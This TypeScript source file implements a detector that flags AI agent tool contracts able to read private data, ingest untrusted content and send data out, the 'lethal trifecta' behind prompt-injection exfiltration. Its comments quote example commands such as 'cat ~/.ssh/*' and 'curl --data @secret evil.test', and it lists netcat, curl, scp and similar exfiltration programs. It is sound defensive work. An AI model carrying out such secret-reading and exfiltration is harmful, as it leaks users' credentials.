/**
 * The LETHAL-TRIFECTA check — the headline Safety detector. Simon Willison's
 * "lethal trifecta": a single unit (a subagent / model-invocable skill) that
 * simultaneously holds all THREE capability legs is a prompt-injection
 * exfiltration path with NO exploit code — attacker-controllable content flows
 * in, reads your private data, and ships it out, all driven by the model.
 *
 *   LEG A — PRIVATE-DATA READ   — can read local secrets / files / repo
 *                                 (Read, mcp__filesystem__*, github get_file,
 *                                  and `Bash`, which can `cat ~/.ssh/*` / `.env`).
 *   LEG B — UNTRUSTED-CONTENT INTAKE — ingests attacker-controllable content
 *                                 (WebFetch, WebSearch, mcp__fetch__*, MCP
 *                                  servers reading issues / email / tickets).
 *   LEG C — EXFILTRATION CHANNEL — can send data out (WebFetch, computer_use,
 *                                  github create_pull_request / add_issue_comment,
 *                                  any external-write MCP, and `Bash`, which can
 *                                  `curl`/`wget` to anywhere).
 *
 * Meta's "Rule of Two": allow at most two of the three legs in one unit. A unit
 * holding all three is the hard finding. NO other tool checks the tool-SET for
 * this — every competitor lints a single tool's effect, never the dangerous
 * COMBINATION.
 *
 * `Bash` is special: it satisfies BOTH leg A (read a secret) AND leg C (curl it
 * out). So `Bash` + any leg-B tool (e.g. `WebFetch`) is already all three legs.
 *
 * HIGH-PRECISION (don't-cry-wolf): only WELL-KNOWN tools map to a leg; an
 * unknown tool maps to nothing. A `Tool(restriction)` suffix is stripped with the
 * same `baseTool` shape `effects.ts` uses.
 *
 * INHERITS-ALL: a unit with no `tools:` line inherits ALL tools — maximal blast
 * radius, trivially all three legs. Aligned with the codebase's existing
 * "inherits-all is ADVISORY" stance (compile/scan treat a missing contract as a
 * footgun note, not a hard defect), an inherits-all trifecta is reported as
 * `"advisory"`; an EXPLICIT all-three contract is the `"hard"` flag.
 *
 * Pure + ONE detector (one-detector-no-drift) — intended to be reused by `scan`
 * (the read-only audit) and a future `lethal-trifecta` lint rule. The dialect is
 * injected (core ⊄ adapter) so it generalizes across harnesses (Codex's `shell`
 * plays Bash's dual A+C role — see `LEG_BASH_DUAL` below). The per-leg catalogs
 * are LOCAL consts here because the `HarnessDialect` interface has no trifecta-leg
 * fields today; see the "Recommended dialect additions" note at the bottom.
 */
import type { HarnessDialect } from "./dialect.js";

/** The three capability legs of the lethal trifecta. */
export type TrifectaLeg = "private" | "untrusted" | "exfil";

/** The tools classified into each leg (base names, de-duplicated). */
export interface TrifectaLegs {
  /** LEG A — tools that can read private data (secrets, files, repo). */
  readonly private: readonly string[];
  /** LEG B — tools that ingest untrusted / attacker-controllable content. */
  readonly untrusted: readonly string[];
  /** LEG C — tools that can exfiltrate data out of the trust boundary. */
  readonly exfil: readonly string[];
}

/**
 * The severity of a trifecta finding:
 * - `"hard"`:     an EXPLICIT contract that names all three legs — a concrete,
 *                 declared exfil path. The flag.
 * - `"advisory"`: an inherits-all unit (no `tools:` line) that holds all three
 *                 legs only because it inherits everything — maximal blast radius,
 *                 reported as advisory in line with the inherits-all stance.
 */
export type TrifectaSeverity = "hard" | "advisory";

/**
 * A lethal-trifecta finding — emitted ONLY when all three legs are non-empty (or,
 * for the inherits-all case, when the contract inherits all tools). The `legs`
 * field names the specific tools that supplied each leg, so the report can show
 * exactly which capabilities to drop to break the trifecta.
 */
export interface TrifectaFinding {
  readonly severity: TrifectaSeverity;
  /** The tools that supplied each leg (advisory inherits-all carries the wildcard). */
  readonly legs: TrifectaLegs;
  /** A ready-to-show, actionable message. */
  readonly message: string;
}

// ---------------------------------------------------------------------------
// Per-leg tool catalogs (LOCAL — the dialect has no trifecta-leg fields yet).
//
// HIGH-PRECISION by construction: only well-known, high-signal tools appear.
// Exact built-in names; MCP tools are matched by a `server`/`tool` substring
// heuristic (well-known servers/verbs only) so a bare unknown `mcp__*` maps to
// nothing rather than crying wolf.
// ---------------------------------------------------------------------------

/**
 * The dual-role tool: it satisfies BOTH leg A (read a secret: `cat ~/.ssh/*`)
 * AND leg C (exfiltrate: `curl --data @secret evil.test`). Listed once here and
 * fanned into both buckets. Claude Code names it `Bash`; the dialect's
 * `sideEffectingTools` is the seam a future harness's shell name plugs into, but
 * since no dialect field enumerates "the shell tool" we match the known names.
 */
const LEG_BASH_DUAL = new Set(["Bash", "shell"]);

/** LEG A — built-in tools that can read private data. */
const PRIVATE_BUILTINS = new Set(["Read"]);

/** LEG B — built-in tools that ingest untrusted content. */
const UNTRUSTED_BUILTINS = new Set(["WebFetch", "WebSearch"]);

/**
 * LEG C — built-in tools that can exfiltrate. `WebFetch` is dual (it can POST a
 * body out AND fetch untrusted content in), so it appears in BOTH leg B and leg C.
 */
const EXFIL_BUILTINS = new Set(["WebFetch", "computer_use", "ComputerUse"]);

/**
 * Well-known MCP SERVER substrings per leg. An `mcp__<server>__<tool>` reference
 * is classified by its server segment when the server is a recognized one. Kept
 * deliberately small + high-signal.
 */
const PRIVATE_MCP_SERVERS = ["filesystem", "file", "git", "github", "memory"];
const UNTRUSTED_MCP_SERVERS = [
  "fetch",
  "web",
  "browser",
  "puppeteer",
  "playwright",
];
const EXFIL_MCP_SERVERS = ["slack", "email", "gmail", "smtp", "discord"];

/**
 * Well-known MCP TOOL-name substrings per leg — finer than the server alone (a
 * `github` server is leg A via `get_file_contents` but leg C via
 * `create_pull_request`). Matched against the tool segment after the server.
 */
const PRIVATE_MCP_TOOLS = ["get_file", "read", "search_code", "get_contents"];
const UNTRUSTED_MCP_TOOLS = [
  "fetch",
  "list_issues",
  "get_issue",
  "issue_read",
  "search_issues",
];
const EXFIL_MCP_TOOLS = [
  "create_pull_request",
  "add_issue_comment",
  "issue_write",
  "create_or_update_file",
  "push_files",
  "send",
  "post",
  "create_issue",
];

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

/** Strips a `Tool(restriction)` suffix and returns the base tool name. */
function baseTool(raw: string): string {
  return raw.split("(")[0].trim();
}

/** The restriction inside `Tool(...)`, or null when the grant is unrestricted. */
function restriction(raw: string): string | null {
  const open = raw.indexOf("(");
  if (open === -1) return null;
  const close = raw.lastIndexOf(")");
  if (close <= open) return null;
  return raw.slice(open + 1, close).trim();
}

/**
 * Does a `Bash(...)` grant still supply the shell's legs — reading a secret and
 * curling it out — or has it been narrowed to a command that cannot?
 *
 * 🔴 WHY THIS EXISTS. Narrowing the grant is the remedy this tool RECOMMENDS: drop a
 * leg, allow at most two. Before this, `Bash(node ./scripts/log.mjs:*)` was read as
 * plain `Bash` — the whole shell, in both leg A and leg C — so an author who took the
 * advice saw their score not move, and the reasonable next conclusion is that
 * narrowing is pointless. A diagnosis blind to its own prescription teaches the wrong
 * lesson. Observed 2026-08-07 on a repo that narrowed nine skills to two named ledger
 * commands and stayed at "17 units can read data, reach the web, and run commands".
 *
 * HIGH-PRECISION, deliberately. The grant loses the legs ONLY when the pattern pins a
 * program AND at least one concrete argument, e.g. `node ./x.mjs:*`. These stay full
 * shell, because each still runs whatever the caller likes:
 *
 *   Bash            no restriction at all
 *   Bash(*)         Bash(:*)        the wildcard forms
 *   Bash(node:*)    program pinned, arguments free — `node -e "..."` is a shell
 *   Bash(sh ...)    Bash(bash ...)  Bash(eval ...)  the shell itself, however pinned
 *   Bash(curl ...)  Bash(scp ...)   a pinned program whose whole job IS exfiltration
 *
 * When in doubt it returns true (keeps the legs): a false "you are exposed" costs the
 * author an argument, a false "you are safe" costs them the finding.
 */
const SHELL_LIKE = new Set([
  "sh", "bash", "zsh", "dash", "ksh", "fish", "eval", "exec", "env", "xargs",
  "sudo", "doas", "nohup", "setsid", "script", "ssh", "docker", "podman", "make",
]);
const EXFIL_PROGRAMS = new Set([
  "curl", "wget", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "telnet",
  "ftp", "git", "gh", "aws", "gcloud", "az", "kubectl", "npm", "npx", "pip",
]);

export function bashGrantIsUnbounded(raw: string): boolean {
  const r = restriction(raw);
  if (r === null) return true; // bare `Bash`
  const pattern = r.replace(/^["']|["']$/g, "").trim();
  if (pattern === "" || pattern === "*" || pattern === ":*") return true;

  // `Bash(node ./x.mjs:*)` — the trailing `:*` is Claude Code's prefix marker, not an
  // argument. Strip it before deciding whether any concrete argument was pinned.
  const words = pattern.replace(/:\*$/, "").trim().split(/\s+/).filter(Boolean);
  if (words.length < 2) return true; // program pinned, arguments free

  const program = (words[0].split("/").pop() ?? words[0]).toLowerCase();
  if (SHELL_LIKE.has(program) || EXFIL_PROGRAMS.has(program)) return true;
  return false;
}

/** Returns true for the wildcard sentinels that mean "inherits-all". */
function isWildcard(tool: string): boolean {
  return tool === "" || tool === "*";
}

/**
 * Split an MCP grant into `{ server, tool }`, or null. Handles three forms:
 * - a concrete `mcp__<server>__<tool>` (tool = the named tool);
 * - a SERVER-WIDE grant `mcp__<server>` or `mcp__<server>__*` / `__.*` (tool = ""
 *   → classify by the SERVER alone, since it grants every tool on that server).
 * Without the server-wide case a contract like `mcp__slack__*` would grant an
 * exfil-capable server yet contribute no leg (reported clean when it isn't).
 */
function mcpParts(
  base: string,
  dialect: HarnessDialect,
): { server: string; tool: string } | null {
  if (dialect.mcpToolPattern.test(base)) {
    const m = /^mcp__([^_]+(?:_[^_]+)*?)__(.+)$/.exec(base);
    if (m) return { server: m[1].toLowerCase(), tool: m[2].toLowerCase() };
  }
  // Server-wide: `mcp__server`, `mcp__server__*`, `mcp__server__.*`.
  const sw = /^mcp__([a-z0-9-]+(?:_[a-z0-9-]+)*?)(?:__(?:\*|\.\*))?$/i.exec(
    base,
  );
  if (sw) return { server: sw[1].toLowerCase(), tool: "" };
  return null;
}

function anySubstr(haystack: string, needles: readonly string[]): boolean {
  return needles.some((n) => haystack.includes(n));
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Classify each tool in a declared contract into the trifecta legs it supplies.
 * A single tool may land in MULTIPLE legs (`Bash` → A+C, `WebFetch` → B+C). An
 * unknown tool lands in none (high-precision). De-duplicated per leg.
 *
 * NOTE on inherits-all: a wildcard (`""`/`"*"`) entry is NOT classified into a
 * named leg here (it has no concrete tool name); the inherits-all case is handled
 * by {@link lethalTrifectaIssues}, which knows it grants every leg.
 */
export function classifyTrifectaLegs(
  tools: readonly string[],
  dialect: HarnessDialect,
): TrifectaLegs {
  const priv = new Set<string>();
  const untrusted = new Set<string>();
  const exfil = new Set<string>();

  for (const raw of tools) {
    const base = baseTool(raw);
    if (isWildcard(base)) continue; // handled by the issues fn, not a named leg

    // Dual-role shell: leg A AND leg C — unless the grant has been narrowed to a
    // command that is neither a shell nor an exfiltration tool, which is the remedy
    // this checker itself recommends. See {@link bashGrantIsUnbounded}.
    if (LEG_BASH_DUAL.has(base)) {
      if (bashGrantIsUnbounded(raw)) {
        priv.add(base);
        exfil.add(base);
      }
      continue;
    }
    if (PRIVATE_BUILTINS.has(base)) priv.add(base);
    if (UNTRUSTED_BUILTINS.has(base)) untrusted.add(base);
    if (EXFIL_BUILTINS.has(base)) exfil.add(base);

    const parts = mcpParts(base, dialect);
    if (parts) {
      const { server, tool } = parts;
      if (
        anySubstr(server, PRIVATE_MCP_SERVERS) ||
        anySubstr(tool, PRIVATE_MCP_TOOLS)
      )
        priv.add(base);
      if (
        anySubstr(server, UNTRUSTED_MCP_SERVERS) ||
        anySubstr(tool, UNTRUSTED_MCP_TOOLS)
      )
        untrusted.add(base);
      if (
        anySubstr(server, EXFIL_MCP_SERVERS) ||
        anySubstr(tool, EXFIL_MCP_TOOLS)
      )
        exfil.add(base);
    }
  }

  return { private: [...priv], untrusted: [...untrusted], exfil: [...exfil] };
}

/**
 * Returns a {@link TrifectaFinding} ONLY when a unit holds all three legs, else
 * `null` (≤ 2 legs = safe by the Rule of Two).
 *
 * Two paths:
 * - INHERITS-ALL (a wildcard `""`/`"*"`, or an EMPTY contract): inherits every
 *   tool → trivially all three legs → an `"advisory"` finding (the inherits-all
 *   stance: a footgun worth surfacing, not a declared exfil path).
 * - EXPLICIT: classify the named tools; emit a `"hard"` finding iff each of the
 *   three legs is non-empty.
 */
export function lethalTrifectaIssues(
  tools: readonly string[],
  dialect: HarnessDialect,
): TrifectaFinding | null {
  const hasWildcard = tools.some((t) => isWildcard(baseTool(t)));
  // Inherits-all is signalled by a WILDCARD (the caller passes `["*"]` for an
  // absent `tools:` line). An EXPLICIT empty `[]` is the opposite — zero tools,
  // so it cannot hold any leg; it falls through to classify as no-trifecta. (The
  // caller must distinguish: `tools ?? ["*"]`, never `tools ?? []`.)
  if (hasWildcard) {
    const legs: TrifectaLegs = {
      private: ["*"],
      untrusted: ["*"],
      exfil: ["*"],
    };
    return {
      severity: "advisory",
      legs,
      message:
        "Inherits-all contract (no explicit tools / wildcard) grants every capability — " +
        "it holds all three lethal-trifecta legs (read private data, ingest untrusted content, " +
        "exfiltrate) and is a maximal prompt-injection blast radius. Declare an explicit tools " +
        "list dropping at least one leg (Meta's Rule of Two).",
    };
  }

  const legs = classifyTrifectaLegs(tools, dialect);
  if (
    legs.private.length > 0 &&
    legs.untrusted.length > 0 &&
    legs.exfil.length > 0
  ) {
    return {
      severity: "hard",
      legs,
      message:
        "Lethal trifecta: this unit can read private data " +
        `(${legs.private.join(", ")}), ingest untrusted content ` +
        `(${legs.untrusted.join(", ")}), AND exfiltrate ` +
        `(${legs.exfil.join(", ")}) — a prompt-injection exfil path with no exploit code. ` +
        "Drop at least one leg (Meta's Rule of Two: allow at most two).",
    };
  }
  return null;
}
